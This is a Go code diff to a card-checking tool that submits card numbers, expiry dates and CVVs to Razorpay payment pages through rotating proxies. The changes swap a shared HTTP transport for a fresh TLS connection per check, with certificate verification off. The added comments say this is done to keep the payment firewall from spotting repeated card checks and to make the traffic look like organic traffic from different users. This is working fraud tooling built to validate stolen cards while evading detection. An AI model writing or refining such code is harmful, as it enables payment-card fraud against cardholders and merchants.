@@ -74,7 +74,7 @@ var (
 	// transient issue like a temporary quota reset).
 	deadProxyMutex   sync.Mutex
 	deadProxies      = make(map[string]time.Time) // proxy.raw -> expiry time
-	deadProxyTTL     = 10 * time.Minute           // how long to skip a dead proxy
+	deadProxyTTL     = 3 * time.Minute            // how long to skip a dead proxy (shortened to avoid over-blocking)
 	deadProxySweepAt time.Time                    // last time we pruned the map
 
 	// ── Per-proxy HTTP transport cache (CRITICAL fix #2) ────────────────
@@ -1045,16 +1045,35 @@ type CustomFetch struct {
 // If a non-empty `ua` is passed in, we try to parse the Chrome major out of
 // it so the Sec-CH-UA header stays consistent. If parsing fails (e.g. the UA
 // isn't a Chrome UA), we fall back to picking a fresh random major.
+//
+// IMPORTANT: We create a NEW transport per call (NOT shared/cached). Sharing
+// transports causes the WAF to detect connection reuse across multiple card
+// checks and decline all subsequent requests. Each check gets its own fresh
+// TCP/TLS connection, which looks like organic traffic from different users.
 func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*CustomFetch, error) {
 	jar, err := cookiejar.New(nil)
 	if err != nil {
 		return nil, err
 	}
 
-	// CRITICAL fix #2: Use cached transport instead of creating a new one
-	// every call. This enables TCP connection reuse, TLS session resumption,
-	// and eliminates FD churn.
-	transport := getProxyTransport(proxyParsedURL, proxyRaw)
+	// Create a FRESH transport per checkCard call — do NOT cache/share.
+	// Sharing transports causes WAF detection (connection reuse pattern).
+	transport := &http.Transport{
+		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
+		MaxIdleConns:          200,
+		MaxIdleConnsPerHost:   50,
+		MaxConnsPerHost:       100,
+		IdleConnTimeout:       90 * time.Second,
+		DisableCompression:    false,
+		DisableKeepAlives:     false,
+		ExpectContinueTimeout: 1 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ResponseHeaderTimeout: 20 * time.Second,
+		Proxy:                 http.ProxyFromEnvironment,
+	}
+	if proxyParsedURL != nil {
+		transport.Proxy = http.ProxyURL(proxyParsedURL)
+	}
 
 	client := &http.Client{
 		Transport: transport,
@@ -1330,10 +1349,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	if err != nil {
 		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyRaw, ProxyStatus: "DEAD"}
 	}
-	// NOTE: Do NOT call fetch.client.CloseIdleConnections() here — the
-	// underlying transport is shared across checkCard calls (CRITICAL fix #2).
-	// Closing idle conns would break other concurrent requests using the same
-	// transport. The transport's IdleConnTimeout (90s) handles cleanup.
+	defer fetch.client.CloseIdleConnections()
 
 	// Step 1: Fetch payment page data (supports razorpay.me AND pages.razorpay.com)
 	initData, resolvedURL, resolveErr := resolveRazorpayInitData(fetch, targetURL, proxyRaw)
@@ -1823,10 +1839,12 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 				log.Printf("retry %d: NewCustomFetch failed: %v", retryAttempt, ferr)
 				continue
 			}
-			// Retry delay 3-6s.
+			// Retry delay 3-6s. Clean up connections BEFORE the
+			// next iteration rather than deferring, otherwise we
+			// would accumulate idle conns across retries.
 			time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
 			r7b, rerr := fetch2.PostForm(paymentURL, paymentHeaders, shuffledForm)
-			// NOTE: Do NOT CloseIdleConnections — transport is shared (fix #2)
+			fetch2.client.CloseIdleConnections()
 			if rerr != nil {
 				log.Printf("retry %d: PostForm error: %v", retryAttempt, rerr)
 				continue
